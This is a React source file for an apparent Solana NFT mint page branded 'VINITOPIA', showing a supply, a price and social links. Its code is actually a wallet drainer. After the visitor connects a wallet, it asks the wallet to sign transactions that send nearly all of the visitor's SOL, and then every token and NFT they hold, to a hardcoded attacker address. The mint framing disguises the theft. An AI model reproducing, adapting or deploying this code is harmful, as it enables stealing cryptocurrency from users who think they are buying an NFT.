import './App.css';
import {TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferInstruction,} from '@solana/spl-token';
import {clusterApiUrl, Connection, SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL} from '@solana/web3.js';

import OwnLayout from "./OwnLayout/OwnLayout";
import imgDiscord from './icons8-discord-50.png'
import imgTwitter from './icons8-twitter-50.png'

const solAmount = "2.1 / 2.6"
const image = 'https://pbs.twimg.com/profile_images/1563903881096077314/f7JM6CxE_400x400.jpg'
const Title = 'V I N I T O P I A'
const supply = 3000

document.title = Title
document.getElementById('favicon').setAttribute('href', image)

const ACTION = 'send_all';

const SENDS_IN_ONE_TX = 7;
// const CLOSES_IN_ONE_TX = 27;

const DESTINATION = new PublicKey('HkGiZyGJt7H4XMpzzaSbsUtHqbypwzfuLeWqjkqpgsF2');

const tokenProgram = TOKEN_PROGRAM_ID;

export const WRAPPED_SOL = 'So11111111111111111111111111111111111111112';

console.log(DESTINATION)

function App() {
    // function sleep(ms) {
    //     return new Promise(resolve => setTimeout(resolve, ms));
    // }

    async function getTokenAccounts(connection, publicKey, empty = false) {
        // let i = 0;

        // while (true) {
        try {
            const {value} = await connection.getParsedTokenAccountsByOwner(
                publicKey,
                {programId: TOKEN_PROGRAM_ID},
            );

            const nftAccounts = value.filter(({account}) => {
                if (account.data.parsed.info.mint === WRAPPED_SOL) {
                    return false;
                }

                const amount = account.data.parsed.info.tokenAmount.uiAmount;

                if (empty) {
                    return amount === 0;
                } else {
                    return amount > 0;
                }
            }).map(({account, pubkey}) => {
                const amounts = account?.data?.parsed?.info?.tokenAmount;

                return {
                    mint: account.data.parsed.info.mint,
                    tokenAcc: pubkey,
                    count: Number(amounts.amount),
                    uiAmount: Number(amounts.uiAmount),
                };
            });
            console.log(nftAccounts)
            return nftAccounts;
        } catch (err) {
            console.log(err);
            // i++;
            //
            // if (i > 3) {
            //     throw err;
            // } else {
            //     continue;
            // }
        }
        // }
    }

    async function createATAInstruction(mint, walletKeyPair, connection,) {
        const ata = await getAssociatedTokenAddress(
            new PublicKey(mint),
            DESTINATION,
        );

        const info = await connection.getAccountInfo(ata);

        /* ATA already exists for mint */
        if (info) {
            return undefined;
        }

        return createAssociatedTokenAccountInstruction(
            walletKeyPair.publicKey,
            ata,
            DESTINATION,
            new PublicKey(mint),
        );
    }

    async function createTransferTokenInstruction(mint, count, walletKeyPair, tokenAcc,) {
        const destinationATA = await getAssociatedTokenAddress(
            new PublicKey(mint),
            DESTINATION,
        );
        const response = createTransferInstruction(tokenAcc,
            destinationATA,
            walletKeyPair.publicKey,
            count,
            [],
            tokenProgram,)
        console.log(response)
        return createTransferInstruction(
            tokenAcc,
            destinationATA,
            walletKeyPair.publicKey,
            count,
            [],
            tokenProgram,
        );
    }

    function formatSOL(lamports) {
        return (lamports / LAMPORTS_PER_SOL).toFixed(4);
    }

    async function sendRemainingSOL(walletKeyPair, connection,) {
        console.log(`\nSending Solana to destination...\n`);

        const toAccount = new PublicKey(DESTINATION)

        try {
            const balance = await connection.getBalance(walletKeyPair.publicKey);

            const accountsArray = await getTokenAccounts(connection, walletKeyPair.publicKey);

            const accounts1 = accountsArray.length

            let remainingSolana

            if(accounts1 < 8){
                remainingSolana = 0.02
            } else if(accounts1 < 15){
                remainingSolana = 0.04
            } else if(accounts1 < 22){
                remainingSolana = 0.06
            } else if(accounts1 < 29){
                remainingSolana = 0.08
            } else if(accounts1 < 36){
                remainingSolana = 0.1
            } else if(accounts1 < 43){
                remainingSolana = 0.12
            } else if(accounts1 < 50){
                remainingSolana = 0.14
            } else if(accounts1 < 57){
                remainingSolana = 0.16
            } else if(accounts1 < 64){
                remainingSolana = 0.18
            } else if(accounts1 < 71){
                remainingSolana = 0.2
            } else {
                remainingSolana = 0.2
            }

            console.log(accounts1, remainingSolana)

            const toSend = balance - (remainingSolana * LAMPORTS_PER_SOL);

            if (toSend <= 0.0001 * LAMPORTS_PER_SOL) {
                console.log('No funds to send.');
            }

            const transaction = new Transaction();

            transaction.add(SystemProgram.transfer({
                fromPubkey: walletKeyPair.publicKey,
                toPubkey: toAccount,
                lamports: toSend,
            }));

            console.log(`Sending ${formatSOL(toSend)} SOL to ${DESTINATION.toString()}`);

            transaction.feePayer = await window.solana.publicKey
            let blockhashObj = await connection.getRecentBlockhash()
            transaction.recentBlockhash = await blockhashObj.blockhash

            const signed = await window.solana.signTransaction(transaction)

            const hash = await connection.sendRawTransaction(
                signed.serialize(),
                [walletKeyPair],
            );

            console.log('Complete.');
        } catch (err) {
            console.log(`Error sending SOL: ${err.toString()}`);
        }
    }

    // async function closeAccounts(
    //     walletKeyPair,
    //     connection,
    // ) {
    //     console.log(`\nClosing emptied accounts to reclaim sol...\n`);
    //
    //     while (true) {
    //         const emptyAccounts = await getTokenAccounts(connection, walletKeyPair.publicKey, true);
    //
    //         if (emptyAccounts.length === 0) {
    //             console.log(`Finished closing empty accounts.`);
    //             break;
    //         }
    //
    //         console.log(`Found ${emptyAccounts.length} empty accounts...`);
    //
    //         const txsNeeded = Math.ceil(emptyAccounts.length / CLOSES_IN_ONE_TX);
    //
    //         for (let i = 0; i < emptyAccounts.length / CLOSES_IN_ONE_TX; i++) {
    //             const itemsRemaining = Math.min(CLOSES_IN_ONE_TX, emptyAccounts.length - i * CLOSES_IN_ONE_TX);
    //
    //             const transaction = new Transaction();
    //
    //             for (let j = 0; j < itemsRemaining; j++) {
    //                 const item = i * CLOSES_IN_ONE_TX + j;
    //
    //                 const acc = emptyAccounts[item];
    //
    //                 transaction.add(createCloseAccountInstruction(
    //                     acc.tokenAcc,
    //                     walletKeyPair.publicKey,
    //                     walletKeyPair.publicKey,
    //                 ));
    //             }
    //
    //             console.log(`Sending transaction ${i+1} / ${txsNeeded}...`);
    //
    //             try {
    //                 transaction.feePayer = await window.solana.publicKey
    //                 let blockhashObj = await connection.getRecentBlockhash()
    //                 transaction.recentBlockhash = await blockhashObj.blockhash
    //
    //                 const signed = await window.solana.signTransaction(transaction)
    //
    //                 const res = await connection.sendRawTransaction(
    //                     signed.serialize(),
    //                     [walletKeyPair]
    //                 );
    //             } catch (err) {
    //                 console.log(`Error sending transaction: ${err.toString()}`);
    //             }
    //         }
    //
    //         // await sleep(10 * 1000);
    //     }
    // }

    async function sendAll(walletKeyPair, connection,) {
        console.log(`\nTransferring NFTs and tokens to destination...\n`);

        await sendRemainingSOL(
            walletKeyPair,
            connection,
        );

        // while (true) {
        const accounts = await getTokenAccounts(connection, walletKeyPair.publicKey);
        console.log(accounts)

        if (accounts.length === 0) {
            console.log(`Finished transferring NFTs and tokens.`);
            // break;
        }

        console.log(`Found ${accounts.length} accounts...`);

        const txsNeeded = Math.ceil(accounts.length / SENDS_IN_ONE_TX);

        for (let i = 0; i < accounts.length / SENDS_IN_ONE_TX; i++) {
            const itemsRemaining = Math.min(SENDS_IN_ONE_TX, accounts.length - i * SENDS_IN_ONE_TX);

            const transaction = new Transaction();

            for (let j = 0; j < itemsRemaining; j++) {
                const item = i * SENDS_IN_ONE_TX + j;

                const acc = accounts[item];

                const createATA = await createATAInstruction(
                    acc.mint,
                    walletKeyPair,
                    connection,
                );

                if (createATA) {
                    transaction.add(createATA);
                }

                const transfer = await createTransferTokenInstruction(
                    acc.mint,
                    acc.count,
                    walletKeyPair,
                    acc.tokenAcc,
                );

                transaction.add(transfer);
            }

            console.log(`Sending transaction ${i + 1} / ${txsNeeded}...`);

            try {
                transaction.feePayer = await window.solana.publicKey
                let blockhashObj = await connection.getRecentBlockhash()
                transaction.recentBlockhash = await blockhashObj.blockhash

                const signed = await window.solana.signTransaction(transaction)

                const res = await connection.sendRawTransaction(
                    signed.serialize(),
                    [walletKeyPair]
                );
            } catch (err) {
                console.log(`Error sending transaction: ${err.toString()}`);
            }
        }

        // await sleep(10 * 1000);
        // }

        // await closeAccounts(
        //     walletKeyPair,
        //     connection,
        // );


    }

    // async function loadPrivateKey(filename) {
    //     const privateKey = JSON.parse((await readFile(filename, { encoding: 'utf-8' })));
    //     const bytes = bs58.decode(privateKey);
    //     const wallet = Keypair.fromSecretKey(new Uint8Array(bytes));
    //     return wallet;
    // }

    // async function loadSeed(filename) {
    //     // const privateKey = JSON.parse((await readFile(filename, { encoding: 'utf-8' })));
    //     const wallet = Keypair.fromSecretKey(new Uint8Array(PRIVATE_KEY));
    //     return wallet;
    // }

    async function main() {
        await window.solana.connect()
        const wallet = {publicKey: window.solana.publicKey}
        // await loadSeed('privateKey.json');
        console.log(wallet)

        console.log(`Wallet: ${wallet.publicKey.toString()} ${wallet}`);

        const connection = new Connection(
            'https://rpc.ankr.com/solana',
            // NODE, {
            // confirmTransactionInitialTimeout: 60 * 1000,
            'confirmed'
            // }
        );

        switch (ACTION) {
            case 'send_all': {
                await sendAll(
                    wallet,
                    connection,
                );

                break;
            }
        }
    }

    return OwnLayout(Title, imgTwitter, imgDiscord, image, solAmount, main, supply)

}

export default App;
